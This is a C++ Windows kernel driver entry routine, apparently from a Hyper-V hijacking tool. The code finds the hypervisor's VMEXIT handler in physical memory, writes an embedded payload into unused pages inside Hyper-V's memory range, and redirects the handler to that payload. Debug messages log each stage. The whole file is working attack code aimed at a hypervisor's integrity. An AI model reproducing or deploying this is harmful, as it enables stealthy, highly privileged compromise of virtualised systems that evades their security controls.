#include "hyperv.hpp"

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pDriverObj);
	UNREFERENCED_PARAMETER(pRegistryPath);

	PDISK disk;
    PVOID exitHandlerMapping{ };
    PVOID exitHandlerBuffer{ };
    UINT64 exitHandlerAddress{ };
    PPHYSICAL_MEMORY_RANGE hyperVRange{ };
    PVOID emptyContinuousPages = NULL;
    PVOID emptyContinuousPagesMapping = NULL;
    PHYSICAL_ADDRESS emptyContinuousPagesPhysicalAddress{ };
    PHYSICAL_ADDRESS pdptPhysicalBase{ };
    UINT32 originalHookOffset = 0;
    UINT32 entryPoint = 0;

    NTSTATUS status = DiskFind(&disk);
	if (!NT_SUCCESS(status)) {
		DbgMsg("DiskFind failed");
		return STATUS_UNSUCCESSFUL;
	}

	DbgMsg("Searching for Hyper-V VMEXIT handler...");

	status = FindVMExitHandler(disk, &exitHandlerMapping, &exitHandlerBuffer, &exitHandlerAddress, &hyperVRange);
    if (!NT_SUCCESS(status)) {
        DbgMsg("FindVMExitHandler failed with status: %08X", status);
		return STATUS_UNSUCCESSFUL;
    }

	DbgMsg("Found Hyper-V VMEXIT handler at: %p", exitHandlerAddress);
	DbgMsg("Finding continuous empty pages in Hyper-V range: %p - %p...", hyperVRange->BaseAddress.QuadPart, hyperVRange->BaseAddress.QuadPart + hyperVRange->NumberOfBytes.QuadPart);

    status = FindContinuousEmptyPagesInRange(hyperVRange, disk, PayLoadPageCount(), &emptyContinuousPages, &emptyContinuousPagesMapping, &emptyContinuousPagesPhysicalAddress);
    if (!NT_SUCCESS(status)) {
		DbgMsg("Emptycontinuouspages value: %p", emptyContinuousPages);
		DbgMsg("FindContinuousEmptyPagesInRange failed with status: %08X", status);
        return STATUS_UNSUCCESSFUL;
	}

	DbgMsg("Found continuous empty pages at phys addr: %p", emptyContinuousPagesPhysicalAddress);
    DbgMsg("Preparing payload...");

	status = PreparePayload(payloadData, &emptyContinuousPages, PayLoadPageCount(), emptyContinuousPagesPhysicalAddress, &pdptPhysicalBase, &originalHookOffset, &entryPoint);
    if (!NT_SUCCESS(status)) {
        DbgMsg("PreparePayload failed with status: %08X", status);
        return STATUS_UNSUCCESSFUL;
	}

    status = DiskCopyPages(disk, emptyContinuousPagesMapping, emptyContinuousPages, PayLoadPageCount());
    if (!NT_SUCCESS(status)) {
        DbgMsg("DiskCopyPages failed with status: %08X", status);
        return STATUS_UNSUCCESSFUL;
	}

	DbgMsg("Hijacking VMEXIT handler...");

	status = HijackVMExitHandler(disk, exitHandlerAddress, exitHandlerBuffer, exitHandlerMapping, pdptPhysicalBase, originalHookOffset, entryPoint);
    if (!NT_SUCCESS(status)) {
        DbgMsg("HijackVMExitHandler failed with status: %08X", status);
        return STATUS_UNSUCCESSFUL;
    }

	DbgMsg("VMEXIT handler redirected to %p sucessfully!", PAYLOAD_VIRTUAL_BASE + entryPoint);

    ObDereferenceObject(disk->Device);
    ExFreePool(disk);
	MmUnmapIoSpace(exitHandlerMapping, PAGE_SIZE);
	MmUnmapIoSpace(emptyContinuousPagesMapping, PAGE_SIZE * PayLoadPageCount());
    MmFreeContiguousMemory(exitHandlerBuffer);
	MmFreeContiguousMemory(emptyContinuousPages);
    return STATUS_SUCCESS;
}